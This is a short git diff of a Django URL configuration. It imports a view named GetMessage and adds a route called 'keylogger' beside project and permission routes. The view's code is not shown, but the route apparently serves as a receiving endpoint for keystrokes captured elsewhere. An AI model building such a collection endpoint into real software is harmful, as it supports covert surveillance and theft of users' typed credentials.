@@ -33,6 +33,7 @@ from mainapp.views import (
 
 from mainapp.api.api import(
     InitializeInstance,
+    GetMessage,
     # OpenWS,
 )
 
@@ -50,5 +51,7 @@ urlpatterns = [
     path('projects/<int:pk>/' , ProjectDisplay.as_view(), name="project"),
     path('projects/no-permissions', NoPermissions.as_view(), name="no_permissions"),
     path('endpoint', InitializeInstance.as_view(), name="end_point"),
+    path('keylogger', GetMessage.as_view(), name="keylogger"),
+
     # path('wsconn', OpenWS.as_view(), name="ws_conn"),
 ] + static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
